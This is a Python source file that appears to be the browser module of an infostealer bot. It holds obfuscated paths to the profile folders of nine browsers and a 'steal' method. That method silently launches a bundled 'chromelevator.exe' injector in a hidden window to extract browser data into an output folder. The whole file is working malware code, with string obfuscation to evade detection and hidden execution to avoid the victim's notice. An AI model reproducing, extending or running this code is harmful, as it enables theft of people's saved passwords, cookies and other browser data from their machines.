import os
import time
import subprocess
import shutil
from datetime import datetime
from typing import Dict, List, Any, Optional
from core.obfuscation import decrypt_string
from core.base import BaseModule

class BrowserModule(BaseModule):
    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        local = os.environ.get('LOCALAPPDATA', '')
        roaming = os.environ.get('APPDATA', '')
        
        self.chromium_browsers = {
            'chrome': {'name': 'Google Chrome', 'path': os.path.join(local, decrypt_string('KV0XDCI0BT4ZHxhXH1w6JjtBHRluFTgWOw=='))},
            'edge': {'name': 'Microsoft Edge', 'path': os.path.join(local, decrypt_string('I1sbGSEiNgQuKzZ9Fl4DJjJnCw48cR0DLhY='))},
            'brave': {'name': 'Brave', 'path': os.path.join(local, decrypt_string('LEAZHSsCNgQuAAtKF2U6OBxTDg5jEysNLQQPSi5lMwkLQFgvLyU4'))},
            'opera': {'name': 'Opera', 'path': os.path.join(roaming, decrypt_string('IUIdGS9xCg08Ax1ZAFw6JiFCHRkvcQoWOxUGXQ=='))},
            'opera_gx': {'name': 'Opera GX', 'path': os.path.join(roaming, decrypt_string('IUIdGS9xCg08Ax1ZAFw6JiFCHRkvcR46eiQeWRBVAw=='))},
            'vivaldi': {'name': 'Vivaldi', 'path': os.path.join(local, decrypt_string('OFsOCiI1MD4GIhldABkiGxpT'))},
            'yandex': {'name': 'Yandex', 'path': os.path.join(local, decrypt_string('N1MWDyspBT4DFgRcF0EkCAFFCw48DQU3KRIYGDZYEhs='))},
            'cent': {'name': 'Cent Browser', 'path': os.path.join(local, decrypt_string('LVcWHwwjNhUpEhhkLmwVHxwSPAo6MA=='))},
            'chromium': {'name': 'Chromium', 'path': os.path.join(local, decrypt_string('LVoKBCM4LA8GKz9LF0tGPg9GGQ=='))}
        }

    def run(self) -> bool:
        """A-04: Implementation of standardized run method."""
        try:
            self.log("Starting browser data extraction...")
            return self.steal()
        except Exception as e:
            self.log(f"Extraction failed: {e}")
            return False

    def steal(self) -> bool:
        """Steals browser data using direct ChromeElevator execution"""
        injector = ChromeInjector()
        if injector.is_available():
            try:
                self.log("Running ChromeElevator for full browser extraction...")
                # Increase timeout to 120s
                success = injector.run_injector(action="all", timeout=120)
                return success
            except Exception as e:
                self.log(f"ChromeElevator execution failed: {e}")
        return False

class ChromeInjector:
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        
        # Priority on chromelevator.exe in core/
        possible_names = [
            os.path.join(self.base_dir, "core", "chromelevator.exe"),
            os.path.join(self.base_dir, "core", "chromelevator_x64.exe"),
            os.path.join(self.base_dir, "bin", "chromelevator_x64.exe"),
            os.path.join(self.base_dir, "chromelevator.exe"),
        ]
        self.injector_path = None
        for name in possible_names:
            if os.path.exists(name):
                self.injector_path = str(name)
                break

    def is_available(self):
        return self.injector_path is not None

    def run_injector(self, action="all", timeout=60):
        if not self.is_available(): return False
        try:
            output_dir = os.path.normpath(os.path.join(self.base_dir, "core", "output"))
            os.makedirs(output_dir, exist_ok=True)
            
            cmd = [self.injector_path, action, "--method", "nt", "-o", output_dir]
            # Use subprocess.DEVNULL to avoid pipe hang, and no capture
            subprocess.run(cmd, timeout=timeout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
            return True
        except Exception as e:
            print(f"Error running injector: {e}")
            return False